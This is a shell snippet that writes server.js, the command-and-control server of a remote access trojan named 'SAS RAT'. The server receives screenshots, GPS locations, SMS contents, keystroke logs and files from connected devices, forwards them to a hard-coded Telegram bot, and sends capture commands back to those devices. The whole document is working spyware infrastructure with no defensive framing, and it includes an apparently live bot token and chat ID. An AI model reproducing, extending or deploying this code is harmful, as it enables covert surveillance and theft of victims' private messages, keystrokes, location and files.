cat > server.js << EOF
const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');
const express = require('express');
const app = express();
const server = app.listen(3000, () => console.log('Server running on port 3000'));
const wss = new WebSocket.Server({ server });

const TOKEN = '7974579225:AAE7NS2E4czBNoll1yh23SqVAlOPt2i-5QM';
const CHAT_ID = '659334247';
const bot = new TelegramBot(TOKEN, { polling: true });

wss.on('connection', (ws) => {
  console.log('Device connected!');
  bot.sendMessage(CHAT_ID, '✅ Device connected! Send /help for commands.');

  ws.on('message', (data) => {
    const msg = JSON.parse(data);
    if (msg.type === 'screenshot') {
      bot.sendPhoto(CHAT_ID, msg.data, { caption: '📸 Screenshot from device' });
    } else if (msg.type === 'location') {
      bot.sendLocation(CHAT_ID, msg.lat, msg.lon, { caption: '📍 Location' });
    } else if (msg.type === 'sms') {
      bot.sendMessage(CHAT_ID, \`📱 SMS: \${msg.content}\`);
    } else if (msg.type === 'keylog') {
      bot.sendMessage(CHAT_ID, \`⌨️ Keylog: \${msg.keys}\`);
    } else if (msg.type === 'files') {
      bot.sendDocument(CHAT_ID, msg.data, { caption: '📁 File from device' });
    }
  });

  ws.on('close', () => {
    bot.sendMessage(CHAT_ID, '❌ Device disconnected!');
  });
});

bot.onText(/\/start/, (msg) => {
  if (msg.chat.id.toString() === CHAT_ID) {
    bot.sendMessage(CHAT_ID, '🤖 SAS RAT Ready! Commands:\\n/screenshot - Take photo\\n/location - Get location\\n/sms - List SMS\\n/keylog - Start keylogger\\n/files - List files\\n/help - This menu');
  }
});

bot.onText(/\/screenshot/, (msg) => {
  if (msg.chat.id.toString() === CHAT_ID) {
    wss.clients.forEach((client) => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(JSON.stringify({ command: 'screenshot' }));
      }
    });
    bot.sendMessage(CHAT_ID, '📸 Screenshot command sent!');
  }
});

bot.onText(/\/help/, (msg) => {
  if (msg.chat.id.toString() === CHAT_ID) {
    bot.sendMessage(CHAT_ID, 'Commands: /start, /screenshot, /location, /sms, /keylog, /files');
  }
});

console.log('Bot started! Send /start to chat.');
EOF
